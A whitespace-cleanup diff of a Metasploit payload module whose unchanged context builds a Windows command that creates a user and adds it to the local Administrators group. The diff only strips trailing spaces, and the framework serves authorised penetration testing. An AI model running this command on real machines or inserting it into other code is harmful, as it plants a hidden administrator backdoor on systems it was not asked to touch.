@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -51,10 +51,10 @@ module Metasploit3
 	def command_string
 		user = datastore['USER'] || 'metasploit'
 		pass = datastore['PASS'] || ''
-		
+
 		if(pass.length > 14)
 			raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
-		end	
+		end
 
 		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
 			"net localgroup Administrators #{user} /ADD"
